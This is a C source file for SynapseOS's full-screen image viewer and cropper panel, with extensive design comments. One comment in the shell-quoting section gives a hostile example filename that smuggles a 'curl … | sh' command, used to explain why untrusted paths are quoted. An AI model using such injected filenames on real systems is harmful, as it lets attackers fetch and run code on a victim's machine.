/*
 * crop.c — the image VIEWER and the image cropper
 *
 * (`synctl dispatch view <file>` / `crop <file>`, the Image Viewer and Image
 * Cropper menu entries, Dolphin's right-click ▸ Crop Image, or the `view`
 * (super+shift+i) and `crop` (super+shift+x) binds.)
 *
 * Opens an image full-screen. The VIEWER shows it whole, zooms, pans and steps
 * through the rest of the folder; the CROPPER lets you drag a rectangle over it
 * and writes the selection out as a new file. It is the one panel here that
 * takes an argument, because it is the one that operates on something rather
 * than configuring something.
 *
 * WHY THE VIEWER IS HERE AND NOT AN APP OF ITS OWN
 *
 * SynapseOS had no image viewer at all: /usr/share/applications named a browser
 * as the answer to "open this PNG", because a browser was the only installed
 * thing that had declared the type. Writing one meant a decoder, a fit, a
 * scaled-copy cache and a full-screen surface — every one of which this file
 * already had, for the cropper. So the viewer is a FACE of this panel and not a
 * second program, which is also why `c` in the viewer is the cropper on the
 * same decoded surface: nothing is read from disk or resampled twice on the way
 * in, and Escape comes back.
 *
 * THREE FACES
 *
 * Which is also why there is a RECENT-IMAGES LIST, opened on when there was no
 * file. Needing an argument made this the one panel that could not be put on a
 * key — there was nothing for the key to name — so it was reachable only from a
 * file manager. The list is the argument, chosen at the point of use instead of
 * before it. `picking` and `viewing` say which face is up; all three are one
 * panel to SYN_PANEL_LIST, with one `visible` and one modal slot.
 *
 * ⚠ Only the cropper writes anything. The viewer is read-only — no rotate that
 * saves, no delete, no "optimise". A viewer that can quietly modify what it is
 * showing is how you lose a photo you only meant to look at.
 *
 * WHY IT IS A COMPOSITOR PANEL AND NOT A SCRIPT
 *
 * The obvious shell version is `slurp` for the region and ImageMagick for the
 * pixels. That does not work: slurp returns SCREEN coordinates, and turning
 * those into IMAGE coordinates needs to know exactly where and at what scale
 * the image is being displayed — which means something has to display it first.
 * Nothing on SynapseOS does. Once you are drawing the image anyway, the crop is
 * arithmetic and the dependency buys nothing.
 *
 * So: the same decoders wppick already uses for its previews, the panel pointer
 * contract for the drag, and cairo to write the result.
 *
 * COORDINATES
 *
 * The selection is held in IMAGE PIXELS, not screen pixels, and converted for
 * drawing. The other way round loses precision on every redraw — a 4000px-wide
 * photo fitted to a 1920px screen means one screen pixel is two image pixels,
 * so a selection stored on screen can only ever land on even coordinates, and
 * "crop exactly this" silently becomes "crop near this". It also breaks
 * outright the moment the panel moves to a different-sized output.
 *
 * WHAT IT WRITES
 *
 * Always a PNG, always a NEW file next to the original: <stem>-crop.png, with
 * -crop-2, -crop-3 … if that exists. Two deliberate choices:
 *
 *   - Never in place. A cropper that overwrites its input is one misdrag away
 *     from destroying the only copy of a photo, and there is no undo here.
 *   - PNG even for a JPEG input. Re-encoding a JPEG to crop it loses quality
 *     for no reason the user asked for; a lossless PNG is the honest output.
 *     Lossless JPEG cropping exists but needs the encoder and a whole
 *     block-alignment discussion, and that is not this.
 *
 * SynapseOS Project
 * SPDX-License-Identifier: GPL-2.0-or-later
 * https://github.com/velle999/SYNAPSE
 */

#define _GNU_SOURCE
#include <ctype.h>          /* isdigit, tolower — the folder walk sorts names naturally */
#include <dirent.h>
#include <errno.h>
#include <fcntl.h>          /* AT_EACCESS, for faccessat() on the scan's dirfd */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include <cairo/cairo.h>
#include <wlr/types/wlr_damage_ring.h>
#include <wlr/util/log.h>

#include "synui.h"

/* Smallest selection worth writing, in image pixels. Below this a drag is
 * almost certainly a stray click, and writing a 2x1 PNG is never what anyone
 * meant. */
#define CROP_MIN_PX 8

/* How close a press has to land to a corner to grab it rather than start a new
 * rectangle, in SCREEN pixels. Screen and not image pixels because the target
 * has to be the same size to the hand on a 24-megapixel photo as on a
 * thumbnail, and an image-pixel radius is neither — on a 6000px photo fitted to
 * 1080p it would be a third of the handle, on a 200px icon a third of the
 * picture. Matched to the drawn handle's 14px arms plus a little slack. */
#define CROP_GRAB_PX 18.0

/* Corner numbering, used as a bit pair so a corner and its opposite differ by
 * an XOR and the render can ask "right?" without a lookup table. */
#define CROP_RIGHT  1
#define CROP_BOTTOM 2

/* ── Viewer limits ───────────────────────────────────────────
 *
 * The zoom step per keypress or wheel notch. 1.25 rather than 2: a doubling
 * skips straight past the magnification anyone actually wants to look at
 * something at, and getting back needs the same coarse step in reverse.
 */
#define VIEW_ZOOM_STEP  1.25

/* The ceiling, as an ABSOLUTE scale — screen pixels per image pixel — and not
 * as a multiple of the fitted one. What "zoomed in as far as it goes" should
 * mean is a fixed apparent size, and a multiple of the fit means the opposite:
 * on a 24-megapixel photo (fit ≈ 0.08) a cap of 16× would still be showing the
 * picture at an eighth of itself, while on a 64px icon the same number is a
 * wall of blur. 8 screen pixels per image pixel is where a pixel is plainly a
 * square and there is nothing further to learn by going on. */
#define VIEW_SCALE_MAX  8.0

/* Keyboard pan, in SCREEN pixels per press — converted to image pixels by the
 * current scale, so the picture moves the same distance under the hand whatever
 * it is being shown at. Shift multiplies it, as it does in the cropper. */
#define VIEW_PAN_PX     60.0

/* How many images in a folder the viewer will step through. A photo directory
 * can hold tens of thousands, and the list is names in memory plus one qsort on
 * the compositor's event-loop thread — the same argument that keeps the recent
 * scan non-recursive. Past this the folder is truncated (in name order) rather
 * than refused: next/previous over the first 4000 is a viewer, and an error is
 * not. */
#define VIEW_NAV_MAX    4000

/* ── Loading ─────────────────────────────────────────────── */

static bool has_ext(const char *path, const char *ext)
{
    size_t lp = strlen(path), le = strlen(ext);
    return lp > le && strcasecmp(path + lp - le, ext) == 0;
}

/* Decode into a cairo surface. The JPEG path is imgdec.c's — shared with the
 * wallpaper and the picker thumbnails, and the one place in the tree that
 * carries a libjpeg error manager and a longjmp, so a corrupt JPEG fails
 * closed instead of taking the compositor down. */
static cairo_surface_t *crop_decode(const char *path)
{
    cairo_surface_t *surf = NULL;

    if (has_ext(path, ".jpg") || has_ext(path, ".jpeg")) {
        surf = syn_decode_jpeg(path);
    } else {
        surf = cairo_image_surface_create_from_png(path);
        if (surf && cairo_surface_status(surf) != CAIRO_STATUS_SUCCESS) {
            cairo_surface_destroy(surf);
            surf = NULL;
        }
        /* A .png that is really a JPEG is common enough (browsers rename on
         * save) that trying the other decoder is worth more than being right
         * about the extension. */
        if (!surf) surf = syn_decode_jpeg(path);
    }

    if (!surf) return NULL;
    if (cairo_image_surface_get_width(surf) < 1 ||
        cairo_image_surface_get_height(surf) < 1) {
        cairo_surface_destroy(surf);
        return NULL;
    }
    return surf;
}

/* Drop the scaled copy. Called whenever the thing it was made from or the size
 * it was made for stops being true. */
static void crop_drop_scaled(syn_server_t *s)
{
    if (s->crop.scaled) {
        cairo_surface_destroy(s->crop.scaled);
        s->crop.scaled = NULL;
    }
    s->crop.scaled_at = 0.0;
}

static void crop_release(syn_server_t *s)
{
    crop_drop_scaled(s);
    if (s->crop.img) {
        cairo_surface_destroy(s->crop.img);
        s->crop.img = NULL;
    }
    s->crop.img_w = s->crop.img_h = 0;
    s->crop.dragging = 0;
}

/* ── The scaled copy ─────────────────────────────────────────
 *
 * Why this exists at all is on the struct in synui.h: resampling the source on
 * every pointer motion cost 122 ms a frame on a 24-megapixel photo and froze
 * the desktop for the length of the drag. This does that work once.
 *
 * Rebuilt when the scale changes rather than on some notification of an output
 * change, because the scale IS the thing that matters — crop_fit() derives it
 * from the output box, so a comparison here catches a resize, a move to another
 * monitor and a scale change without any of them having to know about a cache.
 */
cairo_surface_t *crop_scaled(syn_server_t *s, double scale)
{
    if (!s->crop.img) return NULL;

    /* crop_fit() never scales up, so 1:1 means the source is exactly what
     * should be painted. Copying it would double the memory of a 96 MB photo
     * to save nothing. */
    if (scale >= 0.999) {
        crop_drop_scaled(s);
        return s->crop.img;
    }

    if (s->crop.scaled && s->crop.scaled_at == scale)
        return s->crop.scaled;

    crop_drop_scaled(s);

    int w = (int)(s->crop.img_w * scale + 0.5);
    int h = (int)(s->crop.img_h * scale + 0.5);
    if (w < 1) w = 1;
    if (h < 1) h = 1;

    cairo_surface_t *sc = cairo_image_surface_create(CAIRO_FORMAT_ARGB32, w, h);
    if (!sc || cairo_surface_status(sc) != CAIRO_STATUS_SUCCESS) {
        if (sc) cairo_surface_destroy(sc);
        /* Out of memory for the copy — fall back to the source. The panel then
         * draws correctly and slowly instead of not at all, which is the right
         * way round for a cache. */
        wlr_log(WLR_ERROR, "synui: crop: cannot allocate a %dx%d scaled copy", w, h);
        return s->crop.img;
    }

    cairo_t *cr = cairo_create(sc);
    cairo_scale(cr, scale, scale);
    cairo_set_source_surface(cr, s->crop.img, 0, 0);
    /* GOOD, and now affordable: it is paid once per open instead of once per
     * motion event. The default filter drops pixels rather than averaging them
     * and a photo fitted from 6000px to 1900px comes out visibly aliased, which
     * reads as "the crop tool degraded my image" even though it only ever
     * affects this preview. */
    cairo_pattern_set_filter(cairo_get_source(cr), CAIRO_FILTER_GOOD);
    cairo_rectangle(cr, 0, 0, s->crop.img_w, s->crop.img_h);
    cairo_fill(cr);
    cairo_destroy(cr);

    s->crop.scaled    = sc;
    s->crop.scaled_at = scale;
    return sc;
}

/* ── Recent images ───────────────────────────────────────────
 *
 * WHY THIS EXISTS
 *
 * crop_open() needs a path, so for most of this panel's life the only ways in
 * were `synctl dispatch crop <file>` and Dolphin's context menu — both of which
 * name the file. A keybind has nothing to name, so binding one meant either
 * guessing a file (wrong as often as not) or opening a file dialog synui does
 * not have. A list of what you have touched recently is the answer to "crop
 * something" that does not require having decided what first.
 *
 * WHERE IT LOOKS, AND WHY NOT /usr/share
 *
 * The user's own image folders only. The system wallpaper directories are
 * deliberately NOT scanned even though they are full of images: crop_write()
 * puts <stem>-crop.png beside the original and never anywhere else (see the
 * header — writing in place is how you lose a photo), so every row from
 * /usr/share/backgrounds would be a row that can only ever fail with "Could not
 * write the file". A picker whose entries do not all work is worse than a
 * shorter one. The writability check below is the general form of that: a
 * directory you cannot write to has nothing to offer this panel.
 */

/* The extensions crop_decode() can actually handle. Offering a GIF here would
 * be offering a row that opens "Cannot open that image" — the same argument
 * synui-crop.desktop's MimeType line makes about the context menu. */
static bool crop_is_image(const char *name)
{
    const char *dot = strrchr(name, '.');
    if (!dot) return false;
    return strcasecmp(dot, ".png")  == 0 ||
           strcasecmp(dot, ".jpg")  == 0 ||
           strcasecmp(dot, ".jpeg") == 0;
}

static int crop_recent_cmp(const void *a, const void *b)
{
    const syn_crop_recent_t *x = a, *y = b;
    if (x->mtime != y->mtime) return x->mtime < y->mtime ? 1 : -1;  /* newest first */
    /* Same second is common — a folder unpacked in one go — and readdir's order
     * is not stable, so fall back to the name rather than letting the list
     * reshuffle between openings. */
    return strcmp(x->path, y->path);
}

static void crop_recent_add(syn_server_t *s, const char *path, time_t mt)
{
    for (int i = 0; i < s->crop.recent_count; i++)
        if (strcmp(s->crop.recent[i].path, path) == 0) return;

    if (s->crop.recent_count < CROP_RECENT_MAX) {
        syn_crop_recent_t *e = &s->crop.recent[s->crop.recent_count++];
        snprintf(e->path, sizeof(e->path), "%s", path);
        e->mtime = mt;
        return;
    }

    /* Full: keep the NEWEST that many rather than the first that many found.
     * Stopping at the cap would make the list depend on which directory was
     * scanned first — a Downloads folder with 80 images in it would hide
     * everything in Pictures — and recency is the one thing this list claims to
     * be ordered by. */
    int oldest = 0;
    for (int i = 1; i < CROP_RECENT_MAX; i++)
        if (s->crop.recent[i].mtime < s->crop.recent[oldest].mtime) oldest = i;
    if (mt <= s->crop.recent[oldest].mtime) return;

    snprintf(s->crop.recent[oldest].path, sizeof(s->crop.recent[0].path), "%s", path);
    s->crop.recent[oldest].mtime = mt;
}

static void crop_recent_scan_dir(syn_server_t *s, const char *dir)
{
    /* Open the directory ONCE and ask that descriptor everything else. The
     * writability probe used to be access(dir, W_OK) before the opendir, which
     * is a check on a name followed by a use of the same name: two
     * resolutions, and between them the name can come to mean a different
     * directory, so the scan would list a tree the probe never approved.
     * faccessat() on the open descriptor answers about the directory actually
     * being walked, and fstatat() below does the same for each entry. */
    DIR *d = opendir(dir);
    if (!d) return;

    /* See the section header: a row whose crop cannot be written is not worth
     * offering. This also quietly skips a Pictures directory on a filesystem
     * mounted read-only, which would fail the same way. */
    if (faccessat(dirfd(d), ".", W_OK, AT_EACCESS) != 0) {
        closedir(d);
        return;
    }

    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;          /* dotfiles and . .. */
        if (!crop_is_image(e->d_name)) continue;

        char path[256];
        if (snprintf(path, sizeof(path), "%s/%s", dir, e->d_name) >= (int)sizeof(path))
            continue;   /* too long to store — skip rather than truncate */

        struct stat st;
        if (fstatat(dirfd(d), e->d_name, &st, 0) != 0 || !S_ISREG(st.st_mode))
            continue;

        /* The output of a previous crop. Listing it is not wrong — cropping a
         * crop is legitimate — but a folder worked over a few times fills with
         * them and they crowd out the originals, so they go to the back of the
         * list rather than being hidden: mtime already does that, since a crop
         * is newer than its source. Nothing to do here; noted so the next
         * reader does not "fix" it by filtering them out. */
        crop_recent_add(s, path, st.st_mtime);
    }
    closedir(d);
}

void crop_recent_scan(syn_server_t *s)
{
    s->crop.recent_count = 0;

    const char *home = getenv("HOME");
    if (!home || !*home) {
        wlr_log(WLR_ERROR, "synui: crop: no HOME, nothing to list");
        return;
    }

    /* Pictures, wallpapers and Downloads — where images arrive and where they
     * are kept. Screenshots is called out separately because it is where this
     * panel's most likely input comes from (Print writes there) and because
     * ~/Pictures itself is not scanned recursively: a recursive walk of a photo
     * library is thousands of stat() calls on the compositor's event-loop
     * thread, which is the same mistake the scaled-copy cache exists to undo. */
    static const char *const rel[] = {
        "/Pictures",
        "/Pictures/Screenshots",
        "/Pictures/Wallpapers",
        "/Pictures/wallpapers",
        "/Downloads",
        "/.local/share/wallpapers",
        "/Wallpapers",
    };
    for (size_t i = 0; i < sizeof(rel) / sizeof(rel[0]); i++) {
        char dir[256];
        if (snprintf(dir, sizeof(dir), "%s%s", home, rel[i]) < (int)sizeof(dir))
            crop_recent_scan_dir(s, dir);
    }

    qsort(s->crop.recent, (size_t)s->crop.recent_count,
          sizeof(s->crop.recent[0]), crop_recent_cmp);

    wlr_log(WLR_INFO, "synui: crop: %d recent image(s)", s->crop.recent_count);
}

/* "just now" / "6m ago" / "3h ago" / "5d ago", and a date once relative time
 * stops meaning anything. The point of the column is to let you recognise the
 * screenshot you took a minute ago without reading its timestamp. */
static void crop_ago(time_t t, char *out, size_t n)
{
    long d = (long)(time(NULL) - t);

    if (d < 0)          snprintf(out, n, "just now");   /* clock skew, or a
                                                           file from the future */
    else if (d < 60)    snprintf(out, n, "just now");
    else if (d < 3600)  snprintf(out, n, "%ldm ago", d / 60);
    else if (d < 86400) snprintf(out, n, "%ldh ago", d / 3600);
    else if (d < 86400L * 7) snprintf(out, n, "%ldd ago", d / 86400);
    else {
        struct tm tm;
        if (localtime_r(&t, &tm)) strftime(out, n, "%Y-%m-%d", &tm);
        else                      snprintf(out, n, "—");
    }
}

void crop_recent_row(syn_server_t *s, int i,
                     const char **name, const char **dir, const char **when)
{
    /* Static, like every other _row() here: the render wants three strings for
     * the length of one draw and copying them into it would be three buffers
     * per panel for nothing. */
    static char dbuf[256], wbuf[32];

    *name = *dir = "";
    *when = "";
    if (i < 0 || i >= s->crop.recent_count) return;

    const char *p = s->crop.recent[i].path;
    const char *slash = strrchr(p, '/');

    *name = slash ? slash + 1 : p;

    if (slash && slash != p) {
        size_t dn = (size_t)(slash - p);
        if (dn >= sizeof(dbuf)) dn = sizeof(dbuf) - 1;
        memcpy(dbuf, p, dn);
        dbuf[dn] = '\0';
        *dir = dbuf;
    } else {
        *dir = "/";
    }

    crop_ago(s->crop.recent[i].mtime, wbuf, sizeof(wbuf));
    *when = wbuf;
}

/* ── Geometry ────────────────────────────────────────────────
 *
 * The image is fitted into the output with a margin, preserving aspect. Both
 * the render and the pointer need the same mapping, so it is computed here and
 * nowhere else — the drawn image and the clickable image drifting apart is the
 * exact failure hit.c exists to prevent, one level up.
 */
void crop_fit(syn_server_t *s, struct wlr_box *ob,
              double *scale, double *ox, double *oy)
{
    const int margin = 60;   /* room for the header and footer text */
    double aw = ob->width  - margin * 2;
    double ah = ob->height - margin * 2;
    if (aw < 1) aw = 1;
    if (ah < 1) ah = 1;

    double sx = aw / (double)s->crop.img_w;
    double sy = ah / (double)s->crop.img_h;
    double sc = sx < sy ? sx : sy;
    /* Never scale UP. A 64x64 icon blown across a 4K screen is a wall of
     * blur to select on, and the selection would be quantised to huge steps. */
    if (sc > 1.0) sc = 1.0;

    double dw = s->crop.img_w * sc, dh = s->crop.img_h * sc;
    *scale = sc;
    /* Whole pixels. The image is painted from a copy that is already at this
     * scale, and cairo resamples a blit landing on a fractional offset — which
     * costs a pass over the whole picture and softens it, both for the sake of
     * the half pixel that (width - dw) / 2 leaves when the difference is odd.
     * Rounded HERE rather than in the render so the pointer mapping rounds
     * identically; the two must agree to the pixel or the selection drifts from
     * the rectangle drawn around it. */
    *ox = (double)(int)(ob->x + (ob->width  - dw) / 2 + 0.5);
    *oy = (double)(int)(ob->y + (ob->height - dh) / 2 + 0.5);
}

/* Layout coords -> image pixels, clamped to the image. Clamping rather than
 * rejecting is what lets a drag that runs off the edge of the picture select
 * up to the edge, which is what dragging off the edge means. */
static void crop_to_image(syn_server_t *s, double lx, double ly, int *ix, int *iy)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_fit(s, &ob, &sc, &ox, &oy);
    if (sc <= 0.0) { *ix = *iy = 0; return; }

    double x = (lx - ox) / sc;
    double y = (ly - oy) / sc;

    if (x < 0) x = 0;
    if (y < 0) y = 0;
    if (x > s->crop.img_w) x = s->crop.img_w;
    if (y > s->crop.img_h) y = s->crop.img_h;

    *ix = (int)(x + 0.5);
    *iy = (int)(y + 0.5);
}

/* The selection as a normalised rect in image pixels. The drag stores raw
 * anchor/current points, so this is what turns "dragged up and to the left"
 * into a rectangle with a positive width. */
void crop_selection(syn_server_t *s, int *x, int *y, int *w, int *h)
{
    int x0 = s->crop.ax, y0 = s->crop.ay;
    int x1 = s->crop.bx, y1 = s->crop.by;

    if (x1 < x0) { int t = x0; x0 = x1; x1 = t; }
    if (y1 < y0) { int t = y0; y0 = y1; y1 = t; }

    *x = x0; *y = y0;
    *w = x1 - x0; *h = y1 - y0;
}

int crop_has_selection(syn_server_t *s)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);
    return w >= CROP_MIN_PX && h >= CROP_MIN_PX;
}

/* ── The active corner ───────────────────────────────────────
 *
 * The invariant is on the struct in synui.h: `b` IS the active corner, `a` is
 * the one diagonally opposite. That is what lets the drag, the arrows and a
 * grabbed handle share one mover — they all move `b` — and it is why changing
 * which corner is active is a rewrite of a/b rather than a mode flag every
 * mover has to consult.
 */

/* Recompute which corner `b` has become. Called after anything moves it,
 * because moving it far enough FLIPS the rectangle: nudge the bottom-right
 * corner left past the left edge and it is now the bottom-left one. Without
 * this the highlight would stay drawn on a corner the arrows no longer move. */
static void crop_active_sync(syn_server_t *s)
{
    s->crop.active = (s->crop.bx >= s->crop.ax ? CROP_RIGHT  : 0) |
                     (s->crop.by >= s->crop.ay ? CROP_BOTTOM : 0);
}

/* Make `corner` the active one WITHOUT moving the rectangle: normalise, then
 * re-anchor a and b onto the two diagonal ends. The pixels selected before and
 * after are identical; only which end the next arrow press moves has changed. */
static void crop_set_active(syn_server_t *s, int corner)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);

    s->crop.bx = (corner & CROP_RIGHT)  ? x + w : x;
    s->crop.by = (corner & CROP_BOTTOM) ? y + h : y;
    s->crop.ax = (corner & CROP_RIGHT)  ? x     : x + w;
    s->crop.ay = (corner & CROP_BOTTOM) ? y     : y + h;
    s->crop.active = corner;
}

/* Tab order. Clockwise from the top-left, because that is how a hand expects to
 * walk the corners of a box; the bit values alone would give TL, TR, BL, BR,
 * which is a Z and jumps diagonally across the picture on every third press. */
static const int crop_ring[4] = { 0, CROP_RIGHT,
                                  CROP_RIGHT | CROP_BOTTOM, CROP_BOTTOM };

static void crop_cycle_active(syn_server_t *s, int dir)
{
    int at = 0;
    for (int i = 0; i < 4; i++)
        if (crop_ring[i] == s->crop.active) { at = i; break; }
    crop_set_active(s, crop_ring[(at + dir + 4) % 4]);
}

/* Image pixels -> layout coords. The inverse of crop_to_image(), and it has to
 * STAY the inverse: this is what decides where a corner is grabbable, and the
 * render draws the handle from the same crop_fit() numbers. The two disagreeing
 * is a handle you can see and cannot grab. */
static void crop_to_screen(syn_server_t *s, int ix, int iy, double *lx, double *ly)
{
    struct wlr_box ob;
    server_output_box(s, &ob);

    double sc, ox, oy;
    crop_fit(s, &ob, &sc, &ox, &oy);
    *lx = ox + ix * sc;
    *ly = oy + iy * sc;
}

/* Which corner handle is under the pointer, or -1 for none. Chebyshev distance
 * rather than Euclidean: the drawn handle is an L of two straight arms, so a
 * square target is what it looks like it should be. */
static int crop_corner_at(syn_server_t *s, double lx, double ly)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);

    int best = -1;
    double best_d = CROP_GRAB_PX;

    for (int c = 0; c < 4; c++) {
        double cx, cy;
        crop_to_screen(s, (c & CROP_RIGHT)  ? x + w : x,
                          (c & CROP_BOTTOM) ? y + h : y, &cx, &cy);

        double ax = lx - cx, ay = ly - cy;
        if (ax < 0) ax = -ax;
        if (ay < 0) ay = -ay;
        double d = ax > ay ? ax : ay;

        /* Strictly nearer, so a selection small enough that all four targets
         * overlap resolves to one corner rather than to whichever was tested
         * last. */
        if (d < best_d) { best_d = d; best = c; }
    }
    return best;
}

/* ── Writing it out ──────────────────────────────────────────
 *
 * Never overwrites: see the header. The suffix search stops at 999 so a
 * directory that somehow has them all fails loudly instead of looping. */
static bool crop_out_path(const char *in, char *out, size_t n)
{
    char stem[512];
    snprintf(stem, sizeof(stem), "%s", in);

    /* Strip the extension, if the basename has one. Checked on the BASENAME so
     * a directory called "my.photos" does not get truncated. */
    char *slash = strrchr(stem, '/');
    char *dot   = strrchr(slash ? slash : stem, '.');
    if (dot) *dot = '\0';

    snprintf(out, n, "%s-crop.png", stem);
    if (access(out, F_OK) != 0) return true;

    for (int i = 2; i < 1000; i++) {
        snprintf(out, n, "%s-crop-%d.png", stem, i);
        if (access(out, F_OK) != 0) return true;
    }
    return false;
}

/* Copy the selected rectangle into its own surface and write it.
 * Returns 0 on success. */
static int crop_write(syn_server_t *s, char *written, size_t wn)
{
    int x, y, w, h;
    crop_selection(s, &x, &y, &w, &h);

    /* Clamp to the image once more. The selection is already clamped on the way
     * in, but this is the call that indexes the pixel buffer and it should not
     * depend on that being true somewhere else. */
    if (x < 0) x = 0;
    if (y < 0) y = 0;
    if (x + w > s->crop.img_w) w = s->crop.img_w - x;
    if (y + h > s->crop.img_h) h = s->crop.img_h - y;
    if (w < 1 || h < 1) return -1;

    cairo_surface_t *out = cairo_image_surface_create(CAIRO_FORMAT_ARGB32, w, h);
    if (!out || cairo_surface_status(out) != CAIRO_STATUS_SUCCESS) {
        if (out) cairo_surface_destroy(out);
        return -1;
    }

    cairo_t *cr = cairo_create(out);
    /* SOURCE, not OVER: the crop should be the source pixels exactly, alpha
     * included. OVER would composite a transparent PNG onto the new surface's
     * zeroed (transparent black) background and premultiply the edges. */
    cairo_set_operator(cr, CAIRO_OPERATOR_SOURCE);
    cairo_set_source_surface(cr, s->crop.img, -(double)x, -(double)y);
    cairo_paint(cr);
    cairo_destroy(cr);

    char path[600];
    if (!crop_out_path(s->crop.path, path, sizeof(path))) {
        cairo_surface_destroy(out);
        wlr_log(WLR_ERROR, "synui: crop: no free output name beside '%s'",
                s->crop.path);
        return -1;
    }

    cairo_status_t st = cairo_surface_write_to_png(out, path);
    cairo_surface_destroy(out);

    if (st != CAIRO_STATUS_SUCCESS) {
        wlr_log(WLR_ERROR, "synui: crop: cannot write '%s': %s",
                path, cairo_status_to_string(st));
        return -1;
    }

    snprintf(written, wn, "%s", path);
    wlr_log(WLR_INFO, "synui: crop: wrote %s (%dx%d from %dx%d)",
            path, w, h, s->crop.img_w, s->crop.img_h);
    return 0;
}

/* ── Shell quoting ───────────────────────────────────────────
 *
 * THE PATH IS UNTRUSTED. It arrives as an argument — from Dolphin's context
 * menu, from `synctl dispatch crop <path>`, from anything that can reach the
 * control socket — and synui_spawn() runs /bin/sh -c. A file called
 *
 *     holiday'; curl http://…​ | sh; '.png
 *
 * would execute the moment it was cropped, and a filename is trivially
 * attacker-chosen: it survives a download, an unzip or a USB stick.
 *
 * Single quotes make the shell take every byte literally, and the '\'' dance is
 * the only way to carry a literal single quote through them. Same helper
 * curpick uses on theme directory names, and here for the same reason.
 */
static void crop_shell_quote(const char *in, char *out, size_t n)
{
    size_t o = 0;
    if (n < 3) { if (n) out[0] = '\0'; return; }

    out[o++] = '\'';
    for (size_t i = 0; in[i] && o + 8 < n; i++) {
        if (in[i] == '\'') {
            out[o++] = '\''; out[o++] = '\\'; out[o++] = '\''; out[o++] = '\'';
        } else {
            out[o++] = in[i];
        }
    }
    out[o++] = '\'';
    out[o]   = '\0';
}

/* ── The viewer: the rest of the folder ──────────────────────
 *
 * WHY BY NAME AND NOT BY DATE
 *
 * The recent-images list is sorted by mtime, because "the screenshot I just
 * took" is what that list is for. This one is sorted by NAME, because it is
 * the folder — and a folder of photographs is already in an order, the one the
 * camera numbered them in. Stepping through holiday pictures in the order they
 * were last written to disk is stepping through them in the order they were
 * copied, which is nobody's order.
 */

static void view_nav_free(syn_server_t *s)
{
    for (int i = 0; i < s->crop.nav_count; i++)
        free(s->crop.nav[i]);
    free(s->crop.nav);

    s->crop.nav        = NULL;
    s->crop.nav_count  = 0;
    s->crop.nav_at     = -1;
    s->crop.nav_dir[0] = '\0';
}

/* Compare two names the way a person reads them, with digits as numbers.
 *
 * IMG_9.jpg before IMG_10.jpg — which plain strcmp gets backwards, because it
 * compares '9' against '1'. A camera's own numbering is the one order a viewer
 * must not scramble, and it is exactly the case a byte comparison breaks.
 *
 * Ties fall back to strcmp on the whole name, so the order is TOTAL: without
 * that, "IMG_07" and "IMG_7" compare equal here and qsort may place them either
 * way round, which makes the walk order change between openings of the same
 * folder for no visible reason.
 */
static int nat_cmp(const char *a, const char *b)
{
    const char *a0 = a, *b0 = b;

    while (*a && *b) {
        if (isdigit((unsigned char)*a) && isdigit((unsigned char)*b)) {
            /* Leading zeros are not magnitude: 007 and 7 are the same picture
             * number written twice. Skipped, then the run LENGTHS decide, which
             * is a numeric comparison without parsing anything — and so cannot
             * overflow on a name that is forty digits long. */
            while (*a == '0') a++;
            while (*b == '0') b++;

            const char *as = a, *bs = b;
            while (isdigit((unsigned char)*a)) a++;
            while (isdigit((unsigned char)*b)) b++;

            size_t alen = (size_t)(a - as), blen = (size_t)(b - bs);
            if (alen != blen) return alen < blen ? -1 : 1;

            int d = strncmp(as, bs, alen);
            if (d) return d < 0 ? -1 : 1;
            continue;
        }

        /* Case-insensitively, so Photo.png and photo.png sit together rather
         * than in two blocks either side of the whole alphabet. */
        int ca = tolower((unsigned char)*a), cb = tolower((unsigned char)*b);
        if (ca != cb) return ca < cb ? -1 : 1;
        a++; b++;
    }

    if (*a || *b) return *a ? 1 : -1;
    return strcmp(a0, b0);
}

static int view_nav_cmp(const void *a, const void *b)
{
    return nat_cmp(*(const char *const *)a, *(const char *const *)b);
}

/* List the directory of the file being viewed, and find that file in it.
 *
 * Names only, with the directory held once in nav_dir: a folder of 4000
 * photographs is 4000 paths that are all the same for their first sixty bytes,
 * and the panel already knows which directory it is looking at.
 */
static void view_nav_scan(syn_server_t *s)
{
    view_nav_free(s);
    if (!s->crop.path[0]) return;

    const char *slash = strrchr(s->crop.path, '/');
    if (!slash) return;                       /* a bare name — no folder to walk */

    size_t dn = (size_t)(slash - s->crop.path);
    if (dn == 0) dn = 1;                      /* a file in / — the directory IS "/" */
    if (dn >= sizeof(s->crop.nav_dir)) return;
    memcpy(s->crop.nav_dir, s->crop.path, dn);
    s->crop.nav_dir[dn] = '\0';

    DIR *d = opendir(s->crop.nav_dir);
    if (!d) {
        /* Not an error worth showing: the picture is open and on screen, and
         * the only thing lost is next/previous. A directory that cannot be
         * listed is a normal thing to be handed one file out of. */
        wlr_log(WLR_INFO, "synui: view: cannot list '%s'", s->crop.nav_dir);
        s->crop.nav_dir[0] = '\0';
        return;
    }

    int cap = 0;
    struct dirent *e;
    while ((e = readdir(d))) {
        if (e->d_name[0] == '.') continue;              /* dotfiles and . .. */
        if (!crop_is_image(e->d_name)) continue;
        if (s->crop.nav_count >= VIEW_NAV_MAX) break;

        /* No fstatat() here, unlike the recent scan. That one is offering rows
         * it promises can be cropped, so it checks; this one is a walk order,
         * and a name that turns out to be a directory or a broken symlink fails
         * its decode and view_step() moves on to the next. One syscall per file
         * on the compositor's thread, for four thousand files, to avoid a case
         * that already has a handler. */
        if (s->crop.nav_count >= cap) {
            int ncap = cap ? cap * 2 : 64;
            char **n = realloc(s->crop.nav, (size_t)ncap * sizeof(*n));
            if (!n) break;      /* keep what was collected; the walk is shorter */
            s->crop.nav = n;
            cap = ncap;
        }

        char *dup = strdup(e->d_name);
        if (!dup) break;
        s->crop.nav[s->crop.nav_count++] = dup;
    }
    closedir(d);

    qsort(s->crop.nav, (size_t)s->crop.nav_count, sizeof(*s->crop.nav),
          view_nav_cmp);

    /* Where the open file sits in that order. -1 (not found) is possible and
     * fine — the file may have been past VIEW_NAV_MAX, or named something
     * crop_is_image() does not accept because it arrived from a file manager
     * that decided by content rather than by extension. Next then starts at the
     * top of the folder, which is the only sensible answer to "after a picture
     * that is not in this list". */
    s->crop.nav_at = -1;
    const char *base = slash + 1;
    for (int i = 0; i < s->crop.nav_count; i++)
